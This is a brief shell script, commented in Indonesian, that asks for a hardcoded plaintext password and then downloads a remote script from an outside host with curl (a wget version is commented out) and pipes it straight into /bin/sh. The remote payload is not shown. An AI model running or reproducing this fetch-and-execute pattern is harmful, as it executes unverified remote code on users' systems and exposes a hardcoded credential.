#!/bin/sh

CORRECT_PASSWORD="!Superadmin@0x1999!."

printf "Password: "
stty -echo
read pw
stty echo
echo

[ "$pw" = "$CORRECT_PASSWORD" ] || {
    echo "[ERR] Password salah."
    exit 1
}

# Kalau benar, baru start eksekusi remote script

# Versi pakai wget (pastikan wget ter-install)
# /bin/sh -c "$(wget -qO- https://file.0x1999.tech/arc)"

# Versi lebih aman dipakai kalau wget tidak ada, tapi curl ada:
 /bin/sh -c "$(curl -fsSL https://file.0x1999.tech/arc)"
